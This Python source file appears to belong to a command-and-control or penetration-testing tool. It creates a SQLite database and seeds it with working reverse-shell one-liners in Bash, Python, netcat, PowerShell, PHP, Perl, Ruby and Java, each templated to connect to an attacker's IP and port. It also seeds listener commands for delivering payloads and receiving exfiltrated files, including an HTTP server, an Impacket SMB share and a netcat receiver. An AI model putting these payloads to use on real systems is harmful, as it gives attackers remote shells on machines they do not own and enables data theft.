import sqlite3
import os

def initialize_c2_db(folder_path, db_filename="c2_data.db"):
    """Creates the C2 database and seeds default data."""
    db_path = os.path.join(folder_path, db_filename)
    conn = sqlite3.connect(db_path)
    c = conn.cursor()

    # 1. PAYLOADS TABLE
    c.execute('''
        CREATE TABLE IF NOT EXISTS payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE,
            template TEXT,
            category TEXT
        )
    ''')

    # 2. SERVERS TABLE
    c.execute('''
        CREATE TABLE IF NOT EXISTS servers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE,
            template TEXT,
            default_arg TEXT
        )
    ''')

    # SEED DEFAULTS if empty
    c.execute("SELECT count(*) FROM payloads")
    if c.fetchone()[0] == 0:
        payloads = [
            ("Bash -i", "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1", "Linux"),
            ("Python", "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'", "Linux"),
            ("Netcat -e", "nc -e /bin/bash {IP} {PORT}", "Linux"),
            ("Netcat (OpenBSD)", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f", "Linux"),
            ("PowerShell", "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{IP}\",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()", "Windows"),
            ("PHP", "php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "Web"),
            ("Perl", "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'", "Linux"),
            ("Ruby", "ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "Linux"),
            ("Java", "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()", "Linux")
        ]
        c.executemany("INSERT INTO payloads (name, template, category) VALUES (?, ?, ?)", payloads)

    c.execute("SELECT count(*) FROM servers")
    if c.fetchone()[0] == 0:
        servers = [
            ("Python HTTP Server", "python3 -m http.server {ARG}", "8000"),
            ("Impacket SMB Server", "impacket-smbserver {ARG} . -smb2support", "SHARE"),
            ("PHP Built-in Server", "php -S 0.0.0.0:{ARG}", "8080"),
            ("Netcat Listener (File Rx)", "nc -lvnp {ARG} > received_file", "4444")
        ]
        c.executemany("INSERT INTO servers (name, template, default_arg) VALUES (?, ?, ?)", servers)

    conn.commit()
    conn.close()
    return db_path

# --- PAYLOADS CRUD ---
def get_payloads(db_path):
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM payloads ORDER BY name")
    data = [dict(row) for row in c.fetchall()]
    conn.close()
    return data

def add_payload(db_path, name, template, category="Custom"):
    conn = sqlite3.connect(db_path)
    try:
        conn.execute("INSERT INTO payloads (name, template, category) VALUES (?, ?, ?)", (name, template, category))
        conn.commit()
        return True
    except:
        return False
    finally:
        conn.close()

def delete_payload(db_path, p_id):
    conn = sqlite3.connect(db_path)
    conn.execute("DELETE FROM payloads WHERE id=?", (p_id,))
    conn.commit()
    conn.close()

# --- SERVERS CRUD ---
def get_servers(db_path):
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM servers ORDER BY name")
    data = [dict(row) for row in c.fetchall()]
    conn.close()
    return data

def add_server(db_path, name, template, default_arg):
    conn = sqlite3.connect(db_path)
    try:
        conn.execute("INSERT INTO servers (name, template, default_arg) VALUES (?, ?, ?)", (name, template, default_arg))
        conn.commit()
        return True
    except:
        return False
    finally:
        conn.close()

def delete_server(db_path, s_id):
    conn = sqlite3.connect(db_path)
    conn.execute("DELETE FROM servers WHERE id=?", (s_id,))
    conn.commit()
    conn.close()
